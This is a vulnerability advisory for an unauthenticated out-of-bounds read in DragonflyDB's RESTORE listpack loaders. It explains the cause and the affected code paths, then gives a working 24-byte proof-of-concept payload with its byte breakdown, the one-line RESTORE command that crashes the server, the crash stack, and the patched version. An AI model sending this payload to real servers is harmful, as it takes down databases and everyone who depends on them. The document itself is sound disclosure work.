repo.description:
### Summary

A crafted `RESTORE` payload triggers an out-of-bounds read in DragonflyDB's listpack collection loaders, crashing the entire server process (`SIGSEGV`). Because DragonflyDB requires no authentication by default and `RESTORE` is a normal keyspace command, an **unauthenticated remote attacker can crash the server with a single ~24-byte command** - a remote, repeatable denial of service. There is no operator-side mitigation (no `sanitize-dump-payload` option).

- **Type:** CWE-125 Out-of-Bounds Read
- **Severity:** High - CVSS:3.1 **7.5** (`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`)

### Affected versions

- **Affected:** `<= df-v1.38.1` (confirmed on the official `ghcr.io/dragonflydb/dragonfly:latest` = `df-v1.38.1`)
- **Patched:** **`df-v1.39.0`** - fixed by [dragonflydb/dragonfly#7502](https://github.com/dragonflydb/dragonfly/pull/7502) (merged 2026-06-03, milestone v1.39)

### Details

When loading a listpack-encoded collection (`SET`/`HASH`/`ZSET`/`LIST`/`STREAM`), the `RESTORE` loaders validated the attacker-supplied payload with only a **shallow** check - `lpValidateIntegrity(..., deep=0, ...)`. That check verifies the listpack header (declared total bytes + trailing `0xFF` terminator) but **does not validate any interior entry**.

The loader then iterates the listpack with `lpFirst`/`lpNext`/`lpGet` and trusts the per-entry length field from the (untrusted) data:

```cpp
// src/core/detail/listpack_wrap.cc
std::string_view ListpackWrap::GetView(uint8_t* lp_it, uint8_t int_buf[]) {
  int64_t ele_len = 0;
  uint8_t* elem = lpGet(lp_it, &ele_len, int_buf);
  return std::string_view{reinterpret_cast<char*>(elem), size_t(ele_len)}; // attacker-controlled length
}
```

A 32-bit-string entry (`0xF0`) with a declared length of `0x7fffffff` but no backing data yields a `string_view` far larger than the buffer. `set->Add(elem)` then hashes/copies those bytes → out-of-bounds read → crash. The only guard, `lpAssertValidEntry` = `assert(lpValidateNext(...))`, is **compiled out under `-DNDEBUG`** (the release/Docker build).

Same shallow pattern affects every listpack-backed loader:

| RDB type | Call site |
|---|---|
| `SET_LISTPACK` | `set_family.cc` (`BuildSetFromLP`) |
| `HASH_LISTPACK` | `hset_family.cc` |
| `ZSET_LISTPACK` | `zset_family.cc` |
| `LIST_QUICKLIST_2` | `rdb_load.cc` |
| `SET_INTSET` | `set_family.cc` (`intsetValidateIntegrity(...,0)`) |

The **replication** path reaches the same loaders with `ignore_crc=true`, so a malicious master can crash replicas.

### PoC

24-byte `RESTORE` payload encoding a `SET_LISTPACK` with one 32-bit-string entry of declared length `0x7fffffff` and no data:

```
payload (hex): 140c0c0000000100f0ffffff7fff0b00df3452e8ed1ffe61
```

| Bytes | Meaning |
|---|---|
| `14` | RDB type `SET_LISTPACK` (20) |
| `0c` | RDB string length = 12-byte listpack |
| `0c 00 00 00` | listpack total-bytes = 12 (passes `deep=0` header check) |
| `01 00` | 1 element |
| `f0` | 32-bit string entry |
| `ff ff ff 7f` | entry length = `0x7fffffff` (attacker-controlled) |
| `ff` | `LP_EOF` terminator (passes `deep=0` terminator check) |
| `0b 00` | RDB version 11 |
| `df 34 52 e8 …` | CRC64 footer (attacker-computed; not a security control) |

Send a single unauthenticated command against a default-config server:

```
RESTORE pwn 0 <payload>
```

The server crashes. Observed crash stack (release image `df-v1.38.1`):

```
*** SIGSEGV received ***
  XXH3_hashLong_64b_withSeed       <- hashing the out-of-bounds member
  dfly::StringSet::Add()           <- set->Add(elem) reads OOB
  dfly::SetFamily::LoadLPSetBlob() <- deep=0 loader
  dfly::RdbLoaderBase::OpaqueObjLoader::HandleBlob()
  dfly::OpRestore()                <- the RESTORE command

container state: Exited (139)  ExitCode=139  OOMKilled=false
```

Exit 139 = 128 + 11 (`SIGSEGV`); `OOMKilled=false` confirms a genuine memory fault, not memory exhaustion. Independently reproduced under AddressSanitizer against DragonflyDB's vendored `src/redis/listpack.c` built `-DNDEBUG`, yielding a `heap-buffer-overflow READ`.

### Impact

Remote, **unauthenticated**, repeatable **denial of service**: one ~24-byte command crashes the whole multi-threaded process, taking down all shards, keys, and connections. Trivially scriptable, no privileges required in the default configuration, and no operator-side mitigation exists. A malicious replication master can crash all replicas via the same loaders. The same primitive (copying OOB bytes into a real collection member retrievable via `SMEMBERS`/`HGETALL`) plausibly escalates to heap-memory disclosure, though only the DoS is proven deterministically.

### Fix

Patched in [dragonflydb/dragonfly#7502](https://github.com/dragonflydb/dragonfly/pull/7502): a `LoadConfig::deep_integrity` flag (enabled only for `RESTORE`) threads deep per-entry validation through the SET/HASH/ZSET/LIST/STREAM listpack loaders and routes intset loading through the same check; malformed payloads now return `ERR Bad data format` instead of crashing. **Upgrade to `df-v1.39.0` or later.**
